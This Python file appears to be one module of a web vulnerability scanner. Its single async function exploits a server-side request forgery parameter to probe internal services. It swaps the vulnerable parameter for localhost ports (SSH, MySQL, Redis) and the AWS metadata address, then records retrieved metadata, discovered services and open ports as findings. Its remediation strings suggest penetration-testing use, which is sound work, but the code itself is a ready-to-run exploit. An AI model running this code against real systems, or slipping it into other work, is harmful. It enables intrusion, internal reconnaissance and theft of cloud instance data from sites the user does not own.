import aiohttp
import asyncio
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import time

async def exploit_ssrf_pivot(url, param, log_callback=None, headers=None, proxy=None):
    """
    Attempts to pivot via SSRF to scan internal ports (e.g., Redis, Metadata).
    """
    findings = []
    
    # Evasion Headers
    final_headers = headers.copy() if headers else {}
    
    # Internal targets to scan via the SSRF vulnerability
    internal_targets = [
        "http://127.0.0.1:80",
        "http://127.0.0.1:22", 
        "http://127.0.0.1:3306", # MySQL
        "http://127.0.0.1:6379", # Redis
        "http://127.0.0.1:8080", # Admin?
        "http://169.254.169.254/latest/meta-data/" # AWS Metadata
    ]
    
    try:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if param and param in params:
            async with aiohttp.ClientSession(headers=final_headers) as session:
                for target in internal_targets:
                    p_copy = params.copy()
                    p_copy[param] = [target]
                    exploit_url = urlunparse(parsed._replace(query=urlencode(p_copy, doseq=True)))
                    
                    try:
                        start_t = time.time()
                        async with session.get(exploit_url, timeout=3, ssl=False, proxy=proxy) as resp:
                            duration = time.time() - start_t
                            # Heuristic: 
                            # - If we get content (Metadata) -> Critical
                            # - If we get differencing responses (Timing or Status) -> High
                            
                            text = await resp.text()
                            
                            if "ami-id" in text or "instance-id" in text:
                                findings.append({
                                    "type": "Cloud Metadata Exfiltration (SSRF)",
                                    "severity": "Critical",
                                    "detail": "Successfully retrieved AWS Metadata.",
                                    "evidence": f"Target: {target}\nData Snippet: {text[:100]}",
                                    "remediation": "Block access to 169.254.169.254 from app servers."
                                })
                                continue
                            
                            # Port Scan Heuristic
                            # Redis typically returns error on HTTP request, or specific protocol mismatch
                            if "Redis" in text or "mysql" in text.lower():
                                findings.append({
                                    "type": "Internal Service Discovery (SSRF)",
                                    "severity": "High",
                                    "detail": f"Discovered internal service on {target}.",
                                    "evidence": f"Target: {target}\nResponse Snippet: {text[:100]}",
                                    "remediation": "Restrict outbound connections to localhost."
                                })
                                continue
                                
                            # Connection refused usually raises exception fast. 
                            # If connection works but returns 404/200, it's open.
                            if resp.status < 500:
                                findings.append({
                                    "type": "Internal Port Open (SSRF)",
                                    "severity": "Medium",
                                    "detail": f"Port seems open via SSRF: {target}",
                                    "evidence": f"Status: {resp.status}, Time: {duration:.2f}s",
                                    "remediation": "Firewall internal ports."
                                })

                    except asyncio.TimeoutError:
                        # Timeout might mean filtered or open-but-slow
                        pass
                    except: 
                        # Connection Refused
                        pass
                    
                    await asyncio.sleep(0.1)
    except: pass
    
    return findings
